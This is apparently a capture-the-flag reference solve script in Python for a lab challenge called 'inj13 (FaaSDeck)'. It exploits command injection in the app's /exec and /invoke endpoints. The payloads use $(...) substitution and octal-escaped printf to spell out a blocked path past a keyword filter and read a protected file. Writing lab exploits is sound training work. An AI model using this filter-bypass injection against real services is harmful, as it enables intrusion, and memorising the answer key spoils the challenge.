#!/usr/bin/env python3
"""Reference solve for inj13 (FaaSDeck).

Both guards (deploy-time body allowlist, exec/invoke metachar + "flag"
filter) miss command substitution -- $(...) still reaches the shell. The
path must be built WITHOUT the literal substring "flag" ever appearing in
the HTTP request (the filter greps for it) and WITHOUT globbing (the live
/flag mount is a 0711 root-owned directory with no readdir permission for
the reading uid, so /f*/f* never matches there even though it can on a
world-readable test directory):

    exec:   args = "cat /$(printf %b '\\146\\154\\141\\147')/$(printf %b '\\146\\154\\141\\147')"
    invoke: deploy "head -n 5",
            input = "$(cat /$(printf %b '\\146\\154\\141\\147')/$(printf %b '\\146\\154\\141\\147'))"
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8052")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
PATH_EXPR = ("/$(printf %b '\\146\\154\\141\\147')"
             "/$(printf %b '\\146\\154\\141\\147')")


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)
    try:
        r = requests.post(BASE + "/exec",
                          data={"pod": "web-1", "args": f"cat {PATH_EXPR}"},
                          timeout=15)
        m = FLAG_RE.search(r.text)
        if m:
            print(m.group(0))
            return 0
        requests.post(BASE + "/functions",
                      data={"name": "up", "body": "head -n 5"}, timeout=15)
        r = requests.post(BASE + "/invoke",
                          data={"name": "up", "input": f"$(cat {PATH_EXPR})"},
                          timeout=15)
        m = FLAG_RE.search(r.text) or FLAG_RE.search(r.text.lower())
        if m:
            print(m.group(0))
            return 0
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    sys.stderr.write(f"no flag found (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
